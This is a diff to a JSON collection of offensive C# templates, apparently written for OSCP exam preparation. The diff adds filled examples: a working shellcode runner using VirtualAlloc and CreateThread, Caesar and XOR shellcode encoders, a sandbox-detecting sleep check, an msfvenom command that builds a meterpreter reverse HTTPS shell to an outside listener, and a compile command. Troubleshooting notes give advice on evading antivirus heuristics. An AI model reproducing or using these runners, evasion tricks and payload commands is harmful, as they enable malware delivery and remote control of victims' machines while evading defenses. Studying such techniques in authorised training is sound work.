@@ -5,7 +5,7 @@
     {
       "id": "csharp-shellcode-runner-basic",
       "name": "C# Shellcode Runner (Basic)",
-      "description": "Basic C# template for executing raw shellcode via VirtualAlloc → CreateThread → WaitForSingleObject pattern.\nFoundation for all custom runners.",
+      "description": "Basic C# template for executing raw shellcode via VirtualAlloc \u2192 CreateThread \u2192 WaitForSingleObject pattern.\nFoundation for all custom runners.",
       "category": "shellcode-runners",
       "tags": [
         "anti-virus",
@@ -34,7 +34,8 @@
         "Compilation error - Ensure .NET 4.0+ framework installed",
         "Shellcode doesn't execute - Verify architecture match (x86 vs x64)",
         "Access denied - May need admin rights depending on payload"
-      ]
+      ],
+      "filled_example": "using System;\nusing System.Runtime.InteropServices;\n\nnamespace ShellcodeRunner {\n    class Program {\n        [DllImport(\"kernel32\")]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n        \n        [DllImport(\"kernel32\")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        \n        [DllImport(\"kernel32\")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n        \n        static void Main(string[] args) {\n            byte[] buf = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0 };\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, buf.Length);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}"
     },
     {
       "id": "csharp-caesar-encrypt",
@@ -73,7 +74,8 @@
         "Wrong key - Shellcode corrupted, won't execute",
         "Encryption detected by heuristics - Add sleep timers or API checks",
         "Still flagged - Caesar too simple, use XOR or AES instead"
-      ]
+      ],
+      "filled_example": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { 0xfc,0x48,0x83 };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);\n}\n// Print encoded array\nConsole.WriteLine(\"byte[] encoded = new byte[] { \" + string.Join(\",\", encoded.Select(b => $\"0x{b:X2}\")) + \" };\");\n\n// DECRYPTION (runtime in runner)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);\n}"
     },
     {
       "id": "csharp-xor-encrypt",
@@ -112,7 +114,8 @@
         "Key mismatch - Shellcode corrupted",
         "XOR pattern detected - Use multi-byte key or AES",
         "Still flagged by heuristics - Add sleep timers"
-      ]
+      ],
+      "filled_example": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { 0xfc,0x48,0x83 };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)((uint)buf[i] ^ 0xAA);\n}\n\n// DECRYPTION (runtime - same operation)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)((uint)buf[i] ^ 0xAA);\n}"
     },
     {
       "id": "csharp-sleep-timer",
@@ -151,7 +154,8 @@
         "Advanced sandboxes may wait out sleep - Use longer delays or combine techniques",
         "User impatience - 10 seconds may alert user, consider shorter sleep",
         "False positive on slow systems - Adjust threshold downward"
-      ]
+      ],
+      "filled_example": "using System;\nusing System.Threading;\n\nDateTime t1 = DateTime.Now;\nThread.Sleep(10000);\ndouble deltaT = DateTime.Now.Subtract(t1).TotalSeconds;\nif(deltaT < 9.5) {\n    return; // Sandbox detected - exit\n}\n// Continue with payload execution"
     },
     {
       "id": "csharp-non-emulated-api",
@@ -217,7 +221,8 @@
         "Architecture mismatch - Ensure x64 payload for 64-bit target",
         "Port 443 blocked - Use alternate port and update listener",
         "LHOST not reachable - Verify network connectivity"
-      ]
+      ],
+      "filled_example": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f csharp"
     },
     {
       "id": "compile-csharp-runner",
@@ -256,7 +261,8 @@
         "Syntax errors - Check C# code for typos",
         "Permission denied - Write access required in output directory",
         "Wrong architecture - Use Framework64 for x64, Framework for x86"
-      ]
+      ],
+      "filled_example": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:runner.exe Program.cs"
     }
   ],
   "oscp_relevance": "Essential for custom payload delivery when msfvenom raw payloads are detected. Encryption and heuristic evasion required for modern AV bypass.",
